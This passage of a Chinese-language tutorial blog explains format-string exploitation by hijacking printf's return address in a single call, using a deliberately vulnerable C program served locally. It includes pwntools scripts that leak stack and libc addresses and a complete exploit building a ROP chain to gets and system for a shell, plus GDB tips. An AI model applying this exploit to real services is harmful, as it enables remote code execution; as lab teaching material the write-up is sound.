<li><p>argv[0] 和stack之间的差值不固定,所以需要用%lx打印出argv和argv[0]的值,最后算出写入的address放在参数的第几个位置</p>
</li>
</ul>
</li>
</ul>
<p>###Printf Return Hijack</p>
<ul>
<li><p>当前函数无法return,也没办法GOThijack,可以直接改掉return address</p>
</li>
<li><p>要知道stack address</p>
</li>
<li><p>在一次printf内完成操作</p>
</li>
</ul>
<p>####Printf Hijack In One Shot</p>
<ul>
<li><p>只能Printf return Hijack ,且只能printf一次</p>
</li>
<li><p>只有一次printf的话,只能leak出stack address,来不及改掉printf 的return 地址 </p>
</li>
<li><p>至少要在一次printf内return to main ,才有办法进行多次format string</p>
</li>
</ul>
<p>使用BP chain</p>
<ul>
<li>使用BP chain 来改printf 的 return </li>
<li>相差不超过156,在开启ASLR的情况下,有1/16的概率可以改对(stack 是16-byte aligned)</li>
</ul>
<p>Printf 单次解析限制</p>
<ul>
<li>fomat string会从左到右 解析,当第一个遇到$号的参数会把所有带$的参数存下来</li>
<li>所以类似于<code>%10$hhn%20$lx</code>这种类型,先改值后利用是不行的</li>
<li>但是如果<code>%c%c%c%c%c%c%c%c%c%hhn%20$lx</code>是可以的,因为只有遇到第一个$号才开始取值,前面一路%过去就行</li>
</ul>
<p>接下来结合例题分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fmt3.c</span></span><br><span class="line"><span class="comment">//gcc fmt3.c -o fmt3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">B</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">88</span>];</span><br><span class="line">    fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    alarm(<span class="number">180</span>);</span><br><span class="line">    A();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例题只有一次printf机会,且在B中执行_exit直接退出,没办法改写B的return address,这里可以考虑写掉printf的返回地址.</p>
<h3 id="Exploit-步骤"><a href="#Exploit-步骤" class="headerlink" title="Exploit 步骤"></a>Exploit 步骤</h3><ul>
<li>先leak GOT和stack address,有GOT可以算出libc base,有stack address可以直接改return </li>
<li>用BP改写printf 的return,以上操作需要在一次format string 内完成</li>
<li>没出意外的话可以做第二次format string,用计算出来的地址写掉printf return</li>
<li>利用pop +  ret使程序进入input buffer,就可以进行ROP call system</li>
</ul>
<p>首先checksec看下开了那些保护,编译的时候关闭了PIE,如果开启的话还需要一起泄漏text base</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ checksec fmt3</span><br><span class="line">[*] <span class="string">'/home/sl/Desktop/fmt/a.out'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>



<p><code>$ nc 127.0.0.1 4000</code>然后输入<code>aaaabbbb</code>,在qira中观察printf前栈上的情况,发现有可用的BP chain</p>
<p><img src="/Users/sl/Desktop/fmtpic/fmt3_1.png" alt="fmt3_1"></p>
<p>下一步我们就想办法泄露出GOT和stack address,直接数过去,第一个<code>aaaabbbb</code>(地址是0x40008003c0)是6,然后</p>
<p>地址是0x4000800420的地方是18,那么输入%18$lx就可以泄露出stack address 0x4000800440(0x4000800420处的值)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 127.0.0.1 4000</span><br><span class="line">%18<span class="variable">$lx</span></span><br><span class="line">4000800440</span><br></pre></td></tr></table></figure>

<p>接下来泄露libc base,从程序的got中找到<code>__libc_start_main</code>的地址<code>0x601038</code></p>
<p><img src="/Users/sl/Desktop/fmtpic/fmt3_2.png" alt="fmt3_2"></p>
<p>现在可以leak出我们需要的__libc_start_main和stack address,</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line"><span class="comment">#这里需要填充字符使0x601038不会被分隔开,这里的%8$s是运行之后从stack上算出来的</span></span><br><span class="line">sh.sendline(<span class="string">'%18$p&lt;%8$s&gt;'</span>.ljust(<span class="number">16</span>) + p64(<span class="number">0x601038</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> repr(x)</span><br><span class="line">stack = int(re.findall(<span class="string">'0x(.*)&lt;'</span>,x)[<span class="number">0</span>].ljust(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">__libc_start_main = u64(re.findall(<span class="string">'&lt;(.*)&gt;'</span>,x)[<span class="number">0</span>]+<span class="string">'\x00\x40\x00\x00\x00'</span>)</span><br><span class="line">libc = __libc_start_main  - <span class="number">0x20740</span></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"><span class="keyword">print</span> hex(__libc_start_main)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python ttt.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">4000</span>: Done</span><br><span class="line">[DEBUG] Sent <span class="number">0x19</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">25</span> <span class="number">31</span> <span class="number">38</span> <span class="number">24</span>  <span class="number">70</span> <span class="number">3</span>c <span class="number">25</span> <span class="number">38</span>  <span class="number">24</span> <span class="number">73</span> <span class="number">3</span>e <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  │%<span class="number">18</span>$│p&lt;%<span class="number">8</span>│$s&gt; │    │</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">38</span> <span class="number">10</span> <span class="number">60</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        │<span class="number">8</span>·`·│····│·│</span><br><span class="line">    <span class="number">00000019</span></span><br><span class="line">[DEBUG] Received <span class="number">0x19</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">30</span> <span class="number">78</span> <span class="number">34</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">38</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">34</span> <span class="number">34</span> <span class="number">30</span>  <span class="number">3</span>c <span class="number">40</span> <span class="number">97</span> a6  │<span class="number">0x40</span>│<span class="number">0080</span>│<span class="number">0440</span>│&lt;@··│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">3</span>e <span class="number">20</span> <span class="number">20</span> <span class="number">20</span>  <span class="number">20</span> <span class="number">20</span> <span class="number">38</span> <span class="number">10</span>  <span class="number">60</span>                        │&gt;   │  <span class="number">8</span>·│`│</span><br><span class="line">    <span class="number">00000019</span></span><br><span class="line"><span class="string">'0x4000800440&lt;@\x97\xa6&gt;     8\x10`'</span></span><br><span class="line"><span class="number">0x4000800440</span></span><br><span class="line"><span class="number">0x4000a69740</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p>通过<code>__libc_start_main</code>计算出<code>libc base</code>,<code>objdump -d  /lib/x86_64-linux-gnu/libc-2.23.so | less</code>,搜索<code>&lt;__libc_start_main</code>,减去0x20740之后得到libc base</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000020740 &lt;__libc_start_main@@GLIBC_2.2.5&gt;:</span><br><span class="line">   20740:       41 56                   push   %r14</span><br><span class="line">   20742:       41 55                   push   %r13</span><br><span class="line">   20744:       41 54                   push   %r12</span><br><span class="line">   20746:       55                      push   %rbp</span><br><span class="line">   20747:       48 89 cd                mov    %rcx,%rbp</span><br><span class="line">   2074a:       53                      push   %rbx</span><br><span class="line">   2074b:       48 81 ec 90 00 00 00    sub    $0x90,%rsp</span><br></pre></td></tr></table></figure>

<p>然后就是第二步改写printf的return address,先看下这个东西在哪个地方</p>
<p><img src="/Users/sl/Desktop/fmtpic/fmt_3.png" alt="fmt_3"></p>
<p>思路很清晰,利用BP chain将0x4000800440处的0x40008003b8,然后就可以修改printf的返回地址到main获得再一次的format string.</p>
<p>这里直接一次性修改两个字节,<code>hex(16+936)=0x3b8</code>,main的地址为<code>0x4007A8</code>,相差一个字节,这里可以利用溢出来改写最后一个字节,<code>hex( (0x3b8+240) % 256) = 0xa8</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line"><span class="comment">#这里需要填充字符使0x601038不会被分隔开</span></span><br><span class="line">sh.sendline(<span class="string">'%c'</span>*<span class="number">16</span>   + <span class="string">'%936c'</span> + <span class="string">'%hn%240c%22$hhn'</span> + <span class="string">'%18$p&lt;%14$s&gt;'</span> + p64(<span class="number">0x601038</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> repr(x)</span><br><span class="line">stack = int(re.findall(<span class="string">'0x(.*)&lt;'</span>,x)[<span class="number">0</span>].ljust(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">libc = u64(re.findall(<span class="string">'&lt;(.*)&gt;'</span>,x)[<span class="number">0</span>]+<span class="string">'\x00\x40\x00\x00\x00'</span>)  - <span class="number">0x20740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<p>运行脚本后发现printf的返回地址已经变成main了并且程序在等待我们第二次输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x4000800440</span><br><span class="line">0x4000a49000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ %lx5lx5lx</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    <span class="string">'%lx5lx5lx\n'</span></span><br><span class="line">[DEBUG] Received 0xd bytes:</span><br><span class="line">    <span class="string">'60201a5lx5lx\n'</span></span><br><span class="line">60201a5lx5lx</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p><img src="/Users/sl/Desktop/fmtpic/fmt_4.png" alt="fmt_4"></p>
<p>此时只要控制第二次的printf返回地址直接ret,就可以直接执行我们布置在stack上的ROP了</p>
<p><img src="/Users/sl/Desktop/fmtpic/fmt3_5.png" alt="fmt3_5"></p>
<p>这里有个地方需要注意,我们需要先执行pop3_ret来将一开始写入的fmt stringpop掉,然后进入我们布置好的ROP,调用gets读取输入“sh”,然后将该输入当作system的参数,获得shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">完整EXP:</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"127.0.0.1"</span>,<span class="number">4000</span>)</span><br><span class="line"><span class="comment">#这里需要填充字符使0x601038不会被分隔开</span></span><br><span class="line">sh.sendline(<span class="string">'%c'</span>*<span class="number">16</span>   + <span class="string">'%936c'</span> + <span class="string">'%hn%240c%22$hhn'</span> + <span class="string">'%18$p&lt;%14$s&gt;'</span> + p64(<span class="number">0x601038</span>))</span><br><span class="line">x = sh.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">print</span> repr(x)</span><br><span class="line">stack = int(re.findall(<span class="string">'0x(.*)&lt;'</span>,x)[<span class="number">0</span>].ljust(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">libc = u64(re.findall(<span class="string">'&lt;(.*)&gt;'</span>,x)[<span class="number">0</span>]+<span class="string">'\x00\x40\x00\x00\x00'</span>)  - <span class="number">0x20740</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"><span class="comment">#在qira下libc_base = 0x4000a49000</span></span><br><span class="line">system = libc + <span class="number">0x45390</span></span><br><span class="line">gets = libc + <span class="number">0x6ED80</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"><span class="comment">#这里的相对于RBP的偏移量是固定的</span></span><br><span class="line">offset = <span class="number">0x4000800440</span> - <span class="number">0x4000800310</span></span><br><span class="line">retstack = stack - offset</span><br><span class="line">pop3_ret = <span class="number">0x40086e</span></span><br><span class="line">pop_rdi = <span class="number">0x400873</span></span><br><span class="line"><span class="comment">#这里随便用一块栈上可用的位置存放读取的数据就行</span></span><br><span class="line">rop = [</span><br><span class="line">        pop_rdi,</span><br><span class="line">        stack,</span><br><span class="line">        gets,</span><br><span class="line">        pop_rdi,</span><br><span class="line">        stack,</span><br><span class="line">        system</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'%2158c%8$hn'</span>.ljust(<span class="number">16</span>) + p64(retstack) + <span class="string">''</span>.join(map(p64,rop)))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS:</span><br><span class="line">GDB si,ni,s,n的区别</span><br><span class="line">n/s都是C语言级的断点定位。 s会进入C函数内部,但是不会进入没有定位信息的函数（比如没有加-g编译的代码，因为其没有C代码的行数标记，没办法定位），n不会。</span><br><span class="line">ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会。</span><br><span class="line">归纳:当要进入没有调试信息的库函数调试的时候，用si是唯一的方法。</span><br><span class="line">当进入有调试信息的函数，用si和s都可以，但是他们不同，si是定位到汇编级别的第一个语句，但是s是进入到C级别的第一个语句</span><br><span class="line">譬如si就是在0x80483e8.用s就是0x80483f1;</span><br><span class="line"></span><br><span class="line">gdb调试过程中直接使用print就可以改变变的量值</span><br><span class="line">    jump &lt;linespec&gt;</span><br><span class="line">    指定下一条语句的运行点。&lt;linespce&gt;可以是文件的行号，可以是file:line格式，可以是+num这种偏移量格式。表式着下一条运行语句从哪里开始。</span><br><span class="line">    </span><br><span class="line">    jump &lt;address&gt;</span><br><span class="line">    这里的&lt;address&gt;是代码行的内存地址。</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
</search>
